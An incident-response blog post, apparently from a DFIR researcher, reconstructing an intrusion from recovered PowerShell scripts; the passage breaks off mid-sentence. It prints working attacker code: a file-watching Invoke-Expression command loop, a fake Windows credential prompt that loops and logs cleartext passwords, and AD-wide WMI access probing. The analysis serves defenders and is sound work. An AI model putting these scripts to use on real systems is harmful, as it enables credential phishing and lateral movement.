---
title: Field Notes: Reconstructing an Attacker’s Workflow
url: https://dfir.ch/posts/field_note_attacker_workflow/
source: Over Security
date: 2026-10-24
fetch_date: 2026-10-25T07:10:52.300184
---

# Field Notes: Reconstructing an Attacker’s Workflow

[Home](https://dfir.ch/)
[ ]

Menu

* [Home](/)
* [Posts](/posts/)
* [Talks](/talks/)
* [Tweets](/tweets/)
* |

LIGHT

DARK

# Field Notes: Reconstructing an Attackerâs Workflow

22 Oct 2026

**Table of Contents**

* + [Introduction](#introduction)
  + [A File-Based Command Runner](#a-file-based-command-runner)
  + [Credential Harvesting](#credential-harvesting)
  + [Active Directory Reconnaissance](#active-directory-reconnaissance)
  + [SMB Share Discovery](#smb-share-discovery)
  + [What These Scripts Tell Us](#what-these-scripts-tell-us)
  + [Hunting and Detection](#hunting-and-detection)
  + [Conclusion](#conclusion)

### Introduction

During a recent incident, we recovered several PowerShell scripts the attacker had left behind on disk. Instead of reconstructing every action from individual event log entries, file-system artefacts, and EDR telemetry, we could read some parts of the attackerâs workflow directly from their own code. The scripts covered several stages of post-compromise activity: command execution, credential harvesting, Active Directory reconnaissance, remote-access testing, and SMB share discovery.

Parts of this tradecraft overlap with activity Microsoft [documented](https://www.microsoft.com/en-us/security/blog/2026/08/28/terminalfix-campaign-deploys-reverse-tunnel-through-multistage-intrusion/) in its analysis of the `TerminalFix` campaign, a ClickFix variant that ultimately deploys a reverse tunnel into the victim network. Among other things, Microsoft described a persistent PowerShell loop that watches a local file for commands, executes them, and writes the results to another file.

In this Field Note, we will walk through the PowerShell artefacts we recovered and see what they tell us about the attackerâs workflow.

### A File-Based Command Runner

Microsoft described the same basic mechanism: a persistent `while ($true)` loop watches a file for changes, executes newly written commands, and stores the resulting output in a second file. The recovered script monitors a file in `%TEMP%` and compares its `LastWriteTime` with the previously observed value. When the timestamp changes, the complete file contents are read and passed directly to `Invoke-Expression` (iex). Both standard output and error output are redirected into another file.

![PowerShell scripts](/images/attacker_workflow/powershell_scripts.png "POwerShell scripts")

Figure 1: Various PowerShell artifacts left on disk

Following the relevant code:

```
$watchFile = Join-Path $env:TEMP 'watchFile.txt'
$outputFile = Join-Path $env:TEMP 'outputFile.txt'
$lastWrite = $null

while ($true) {
    $currentWrite = (Get-Item $watchFile -ErrorAction SilentlyContinue).LastWriteTime
    if ($currentWrite -ne $lastWrite) {
        try {
            $content = Get-Content $watchFile -Raw -ErrorAction Stop
            try {
                & { iex $content } *>$outputFile
            } catch {
                $_ | Out-File $outputFile -Append
            }
        } catch {
            Start-Sleep -Seconds 1
        }
        $lastWrite = $currentWrite
    } else {
        Start-Sleep -Seconds 1
    }
}
```

### Credential Harvesting

One of the more interesting PowerShell scripts left behind by the attacker presents the victim with a Windows credential prompt claiming that authentication is required. It repeatedly calls `PromptForCredential()` and requests credentials for a predefined user account.

![Authentication prompt](/images/attacker_workflow/authentication.png "Authentication prompt")

Figure 2: Authentication prompt

The most relevant parts are these:

```
$targetUser = 'DOMAIN\user'

$cred = $host.UI.PromptForCredential(
    'Windows Security',
    "Enter your credentials for: $targetUser",
    $targetUser,
    ''
)

$plainUser = $cred.UserName
$plainPass = $cred.GetNetworkCredential().Password
```

`PromptForCredential()` returns a `PSCredential object` containing a `SecureString`, but the attacker immediately converts it back into a plaintext password using: `$cred.GetNetworkCredential().Password`. The script then performs two separate checks. First, it verifies that the supplied username matches the account the attacker is interested in:

```
if (
    $plainUser -ne $targetUser -and
    $plainUser -ne $targetUser.Split('\')[-1]
) {
    # Wrong account
    continue
}
```

Entering valid credentials for a different account is therefore not enough. If the username matches, the script tries to start a hidden PowerShell process using the supplied credentials:

```
Start-Process `
    -FilePath 'powershell.exe' `
    -Credential $cred `
    -ArgumentList 'exit' `
    -WindowStyle Hidden `
    -ErrorAction Stop
```

The attacker uses process creation as a credential-validation mechanism. A successful call indicates that Windows accepted the supplied credentials for this process-creation attempt. However, it does not necessarily prove that the credentials can be used to authenticate against other systems or access network resources.

![Incorrect password](/images/attacker_workflow/incorrect_password.png "Incorrect password")

Figure 3: Login failed

**The victim cannot simply get rid of the prompt by entering arbitrary credentials. The script continues until the victim supplies credentials for the expected account that successfully authenticate the user.** Every attempted password is written to a log file in cleartext. The actual recovered file contained the attempted password in cleartext.

```
[2026-09-14 10:49:34] CANCELLED - No credentials entered
[2026-09-14 10:49:41] CANCELLED - No credentials entered
[2026-09-14 10:49:43] CANCELLED - No credentials entered
[2026-09-14 21:01:35] CANCELLED - No credentials entered
[2026-09-14 21:02:19] FAILED - Invalid password for: dfir\malmoeb | Password: dfir.ch
```

From an incident-response perspective, that file is obviously extremely sensitive. If such an artefact is recovered, any credentials contained in it have to be considered compromised regardless of whether the attacker’s later actions are visible.

There is an interesting lesson here: **credential theft does not always require LSASS dumping, browser credential extraction, or a dedicated infostealer.** Sometimes the attacker simply asks the user for the password. It also fits nicely with a talk I gave called âCleartext Passwords and Where to Collect Themâ: cleartext credentials still turn up in far more places than many investigators expect.

### Active Directory Reconnaissance

The next script shifts from credential collection to network discovery. It starts by querying Active Directory through `DirectoryServices.DirectorySearcher`:

```
$ds = New-Object DirectoryServices.DirectorySearcher
$ds.Filter = '(&(sAMAccountType=805306369))'

$cs = $ds.FindAll() |
    ForEach-Object {
        $_.Properties['dnshostname']
    } |
    Where-Object {
        $_
    }
```

The `sAMAccountType` value `805306369` identifies computer accounts. The result is therefore a list of Active Directory computer objects for which the `dNSHostName` attribute is populated. This does not necessarily mean that every returned system is still active or reachable; stale computer objects may also be present.

The script then creates a runspace pool with up to 30 concurrent workers and executes the following query against every discovered computer:

```
Get-WmiObject `
    Win32_OperatingSystem `
    -ComputerName $v.computer `
    -ErrorAction Stop
```

Systems for which the WMI query succeeds are added to the final result: `Write-Host "Local admin access on $($ok.Count) computers:"` The script labels these systems as having âlocal admin access,â but that description is slightly misleading. What it actually proves is that the current security context can successfully perform the remote WMI/DCOM query against that system.

Local administrator privileges commonly provide that capability, but delegated WMI permissions and other configuration differences can produce the same result. Althoug...